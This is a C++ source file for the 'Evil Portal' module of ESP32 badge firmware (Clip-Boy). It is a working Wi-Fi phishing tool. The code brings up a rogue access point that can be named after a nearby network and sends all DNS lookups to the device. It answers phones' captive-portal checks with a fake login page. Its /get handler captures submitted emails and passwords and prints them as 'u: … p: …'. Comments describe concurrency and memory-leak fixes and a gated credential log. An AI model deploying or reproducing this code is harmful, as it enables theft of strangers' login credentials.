#include "EvilPortal.h"
#include <LittleFS.h>  // Clip-Boy local patch: built-in template fallback (no SD required)

// Clip-Boy: where the built-in Evil Portal templates live in LittleFS. Staged by
// build.sh from assets/littlefs_res34rch/examples/evil_portal/ into the shared
// littlefs image, so a badge with no SD card can still serve the example page.
#ifndef CB_EP_LFS_DIR
  #define CB_EP_LFS_DIR "/examples/evil_portal/"
#endif

#ifdef HAS_PSRAM
  char* index_html = nullptr;
#endif

// Clip-Boy local patch (DC34): serializes the captured-credential char buffers
// between the /get web handler (AsyncTCP task) and the main task's main()/accessors.
static portMUX_TYPE cred_mux = portMUX_INITIALIZER_UNLOCKED;

AsyncWebServer server(80);

EvilPortal::EvilPortal() {
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  #ifdef CLIPBOY_RES34RCH
    #ifdef HAS_SD
      if (sd_obj.supported) {
        sd_obj.listDirToLinkedList(html_files, "/", "html");

        Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
      }
    #endif
  #endif
}

void EvilPortal::cleanup() {
  // Clip-Boy local patch (DC34 heap-leak): free the per-activation network
  // resources the integration test caught leaking (~DRAM/cycle). Previously
  // cleanup() only freed the PSRAM HTML, so each Evil Portal Start/Stop leaked
  // the DNS UDP pcb + SoftAP netif/DHCP pool, and the web handlers grew unbounded
  // (see startAP register-once guard). The web server + AsyncTCP task are
  // one-time infra owned by the global `server`, so we do NOT touch them here.
  this->ap_index = -1;

  this->dnsServer.stop();
  WiFi.softAPdisconnect(true);

  // Clip-Boy local patch (DC34 UAF): do NOT free index_html here. The web handlers
  // that stream it (send_P/send, registered ONCE for the app lifetime -- see the
  // s_server_registered guard in startAP) can still be servicing an in-flight
  // AsyncTCP request when cleanup() runs on the main task; freeing it mid-stream is
  // a use-after-free. The PSRAM buffer is a single MAX_HTML_SIZE allocation that
  // setHtml() reuses (overwrites) each activation, so keeping it for the app
  // lifetime (matching the handlers) costs nothing and closes the race.
}

#ifdef CLIPBOY_RES34RCH
bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;

  startPortal();

  return true;
}
#endif // CLIPBOY_RES34RCH

String EvilPortal::get_user_name() {
  char tmp[MAX_CRED_SIZE];
  portENTER_CRITICAL(&cred_mux);
  strlcpy(tmp, this->user_name, sizeof(tmp));
  portEXIT_CRITICAL(&cred_mux);
  return String(tmp);
}

String EvilPortal::get_password() {
  char tmp[MAX_CRED_SIZE];
  portENTER_CRITICAL(&cred_mux);
  strlcpy(tmp, this->password, sizeof(tmp));
  portEXIT_CRITICAL(&cred_mux);
  return String(tmp);
}

// ============================================================
// Active (transmitting / phishing) Evil Portal implementation.
// Gated to Res34rch-Boy only. In the Sn34k-Boy (listen-only) build these
// methods are not compiled (and not referenced — every caller in
// WiFiScan/CommandLine is itself gated), so no AP-bring-up, web server,
// DNS redirect, or credential capture code/strings ship.
// ============================================================
#ifdef CLIPBOY_RES34RCH

void EvilPortal::setupServer() {
  #ifndef HAS_PSRAM
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send_P(200, "text/html", index_html);
      Serial.println(F("client connected"));
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #else
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send(200, "text/html", index_html);
      Serial.println("client connected");
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Client connected to server"));
      #endif
    });
  #endif

  const char* captiveEndpoints[] = {
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/success.txt",
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect"
  };

  for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
    
    #ifndef HAS_PSRAM
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
      });
    #else
      server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
        request->send(200, "text/html", index_html);
      });
    #endif
  }

  server.on("/get-ap-name", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    // Clip-Boy local patch (DC34): copy into the fixed cred buffers under the
    // spinlock so the main task never reads them mid-write. (Runs on the AsyncTCP task.)
    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      portENTER_CRITICAL(&cred_mux);
      strlcpy(this->user_name, inputMessage.c_str(), MAX_CRED_SIZE);
      this->name_received = true;
      portEXIT_CRITICAL(&cred_mux);
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      portENTER_CRITICAL(&cred_mux);
      strlcpy(this->password, inputMessage.c_str(), MAX_CRED_SIZE);
      this->password_received = true;
      portEXIT_CRITICAL(&cred_mux);
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println(F("Setting HTML from serial..."));
  String htmlStr = Serial.readString();   // named local: outlives the c_str() below (was a dangling temporary)
  #ifdef HAS_PSRAM
    if (!index_html) index_html = (char*) ps_malloc(MAX_HTML_SIZE);
  #endif
  if (!index_html) { Serial.println(F("html alloc failed")); return; }
  if (htmlStr.length() >= MAX_HTML_SIZE) {  // reject overflow instead of truncating mid-tag
    Serial.println(F("html too large"));
    return;
  }
  strlcpy(index_html, htmlStr.c_str(), MAX_HTML_SIZE);  // bound on DESTINATION size, not strlen(src)
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println(F("html previously set"));
    return true;
  }
  Serial.println(F("Setting HTML..."));
  File html_file;
  #ifdef HAS_SD
    if (sd_obj.supported) html_file = sd_obj.getFile("/" + this->target_html_name);
  #endif
  // Clip-Boy fallback: no SD (or file not on the card) -> serve the built-in
  // template from LittleFS. Identical fs::File API; LittleFS is already mounted.
  if (!html_file) {
    String lfs_path = String(CB_EP_LFS_DIR) + this->target_html_name;
    html_file = LittleFS.open(lfs_path.c_str(), "r");
    if (html_file) Serial.println("Evil Portal HTML from LittleFS: " + lfs_path);
  }
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large."));
        this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
        this->sendToDisplay(F("Touch to exit..."));
      #endif
      Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    #ifdef HAS_PSRAM
      if (!index_html) index_html = (char*) ps_malloc(MAX_HTML_SIZE);
    #endif
    if (!index_html) { Serial.println(F("html alloc failed")); return false; }
    strlcpy(index_html, html.c_str(), MAX_HTML_SIZE);  // bound on DESTINATION (file already size-checked <= MAX_HTML_SIZE)
    this->has_html = true;
    Serial.println("html set");
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    File ap_config_file;
    #ifdef HAS_SD
      if (sd_obj.supported) ap_config_file = sd_obj.getFile("/ap.config.txt");
    #endif
    // Clip-Boy fallback: no SD (or file absent) -> read the built-in AP name from LittleFS.
    if (!ap_config_file) {
      ap_config_file = LittleFS.open(CB_EP_LFS_DIR "ap.config.txt", "r");
      if (ap_config_file) Serial.println(F("Evil Portal ap.config.txt from LittleFS"));
    }
    // Could not open config file. return false
    if (!ap_config_file) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("Could not find /ap.config.txt."));
        this->sendToDisplay(F("Touch to exit..."));
      #endif
      Serial.println(F("Could not find /ap.config.txt. Use stopscan..."));
      return false;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay(F("The given AP name is too large."));
          this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
          this->sendToDisplay("Touch to exit...");
        #endif
        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from config file"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large."));
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given AP name is too large."));
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The given AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #ifdef HAS_SCREEN
      this->sendToDisplay(F("Could not configure Access Point."));
      this->sendToDisplay(F("Touch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    Serial.println(F("ap config set"));
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
  this->has_ap = true;
  Serial.println(F("ap config set"));
  return true;
}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  Serial.print(F("starting ap "));
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  #ifdef HAS_SCREEN
    this->sendToDisplay(F("AP started"));
  #endif

  Serial.print(F("ap ip address: "));
  Serial.println(WiFi.softAPIP());

  // DNS is per-activation (cleanup() stops it) -> re-start every bring-up.
  this->dnsServer.start(53, "*", WiFi.softAPIP());
  Serial.println(F("DNS Server started"));

  // Clip-Boy local patch (DC34 heap-leak): register the web-server endpoints +
  // captive handler ONCE for the app lifetime. setupServer() appends ~12 handlers
  // and addHandler() allocates a CaptiveRequestHandler; re-running them every
  // Start leaked those per activation (unbounded server._handlers growth). The
  // handlers are owned by the global `server` and the singleton `this` is stable,
  // so once is enough. The AP + DNS themselves ARE rebuilt each cycle (cleanup()).
  static bool s_server_registered = false;
  if (!s_server_registered) {
    this->setupServer();
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    server.begin();
    s_server_registered = true;
    Serial.println(F("Server endpoints configured (once)"));
  }
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  // Clip-Boy local patch (DC34): snapshot the cred buffers + clear the flags under
  // the spinlock (short critical section), then format/print/save OUTSIDE the lock.
  bool ready = false;
  char u[MAX_CRED_SIZE], p[MAX_CRED_SIZE];
  portENTER_CRITICAL(&cred_mux);
  if (this->name_received && this->password_received) {
    strlcpy(u, this->user_name, sizeof(u));
    strlcpy(p, this->password, sizeof(p));
    this->name_received = false;
    this->password_received = false;
    ready = true;
  }
  portEXIT_CRITICAL(&cred_mux);

  if (ready) {
    char line[2 * MAX_CRED_SIZE + 16];
    snprintf(line, sizeof(line), "u: %s p: %s\n", u, p);
    Serial.print(line);
    // Clip-Boy local patch (audit 2026-07-24 SB4, completed 2026-07-28): the OTHER half of the
    // credential sink. Gating startLog() in RunEvilPortal removed the /evil_portal_<n>.log file
    // but NOT this append -- and Buffer::append gates only on `writing`, which nothing on the
    // portal path sets or clears any more, so it INHERITS an open capture from a previous tool
    // (e.g. the Geiger, which calls startPcap("deauth") without setting cb_op_running, so no
    // teardown runs when the portal starts). Result: harvested third-party credentials flushed
    // into /pcaps/<n>.pcap every ~150 ms -- on LITTLEFS, not just SD, when no card is fitted.
    // Compile-gated rather than runtime-guarded so the guarantee is structural: with the default
    // (flag unset) the call is not in the binary and cannot depend on unrelated runtime state.
    // ⚠ Do NOT "simplify" this back to an unconditional append, and do not assume the runtime
    // `writing` flag protects you -- that assumption is exactly what produced the half-fix.
#if defined(CB_EVIL_PORTAL_LOG_SD) && CB_EVIL_PORTAL_LOG_SD
    buffer_obj.append(line);
#endif
    #ifdef HAS_SCREEN
        this->sendToDisplay(line);
    #endif
  }
}

#endif // CLIPBOY_RES34RCH
